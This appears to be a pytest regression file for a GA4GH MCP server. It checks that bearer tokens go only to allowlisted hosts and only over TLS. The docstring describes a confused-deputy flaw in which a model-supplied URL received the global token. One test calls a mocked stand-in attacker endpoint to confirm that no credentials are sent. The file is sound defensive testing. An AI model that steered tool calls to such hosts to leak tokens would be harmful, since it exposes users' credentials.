"""Credentials are bound to the host (and TLS) they were configured for.

``service_request`` and every typed tool accept a raw URL from the model. With
``GA4GH_MCP_BEARER_TOKEN`` set, that token was attached to *any* host named, which is the
confused-deputy exfiltration reported against DNAstack/ga4gh-mcp-server.
"""

from __future__ import annotations

import json

import httpx
import pytest
import respx

from ga4gh_mcp.auth.manager import AuthManager
from ga4gh_mcp.auth.store import TokenStore
from ga4gh_mcp.config import Settings
from ga4gh_mcp.http import AsyncHttp
from ga4gh_mcp.server import build_server

pytestmark = pytest.mark.asyncio


@pytest.fixture(autouse=True)
def _isolated_home(tmp_path, monkeypatch):
    monkeypatch.setenv("GA4GH_MCP_HOME", str(tmp_path / "home"))


def _mgr(tmp_path, **kw):
    http = AsyncHttp(timeout=5, max_retries=0)
    return AuthManager(Settings(**kw), http, TokenStore(path=tmp_path / "t.json")), http


async def _call(mcp, name, args):
    r = await mcp.call_tool(name, args)
    if isinstance(r, tuple):
        content, raw = r
        if raw is not None:
            return raw
        r = content
    return json.loads(r[0].text)


@respx.mock
async def test_global_bearer_not_sent_to_model_chosen_host():
    sink = respx.get("https://attacker.test/collect").mock(return_value=httpx.Response(200, json={}))
    mcp, ctx = build_server(Settings(registry_url="https://registry.example/v1",
                                     bearer_token="glob-secret", max_retries=0))
    try:
        await _call(mcp, "service_request",
                    {"service_id_or_url": "https://attacker.test", "path": "/collect"})
    finally:
        await ctx.aclose()
    assert sink.called
    assert "authorization" not in sink.calls[0].request.headers


async def test_global_bearer_only_for_allowlisted_hosts(tmp_path):
    mgr, http = _mgr(tmp_path, bearer_token="glob", bearer_hosts="allowed.test")
    assert await mgr.resolve_headers("https://allowed.test/x") == {"Authorization": "Bearer glob"}
    assert await mgr.resolve_headers("https://other.test/x") == {}
    await http.close()


async def test_per_host_token_not_sent_over_plain_http(tmp_path, monkeypatch):
    monkeypatch.setenv("GA4GH_MCP_TOKEN_DATA_TERRA_BIO", "env-token")
    mgr, http = _mgr(tmp_path)
    assert await mgr.resolve_headers("https://data.terra.bio/x") == {"Authorization": "Bearer env-token"}
    assert await mgr.resolve_headers("http://data.terra.bio/x") == {}
    await http.close()


async def test_loopback_http_still_allowed_for_local_development(tmp_path, monkeypatch):
    monkeypatch.setenv("GA4GH_MCP_TOKEN_LOCALHOST_8080", "dev")
    mgr, http = _mgr(tmp_path)
    assert await mgr.resolve_headers("http://localhost:8080/x") == {"Authorization": "Bearer dev"}
    await http.close()
